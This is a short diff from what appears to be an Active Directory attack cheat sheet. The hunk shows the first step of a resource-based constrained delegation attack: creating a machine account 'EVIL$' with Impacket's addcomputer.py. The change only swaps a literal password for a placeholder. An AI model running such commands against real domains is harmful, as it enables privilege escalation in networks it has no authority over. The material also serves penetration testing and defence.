@@ -234,7 +234,7 @@ Kerberos delegation, domain trusts, and AdminSDHolder abuse.
 **RBCD - add a controlled machine as delegate:**
 
     # 1. Create a machine account (any domain user can by default)
-    addcomputer.py -computer-name EVIL$ -computer-pass 'Password123!' \
+    addcomputer.py -computer-name EVIL$ -computer-pass '<PASSWORD>' \
       corp.local/USER:PASS -dc-ip 10.10.10.10
 
     # 2. Set RBCD on the target
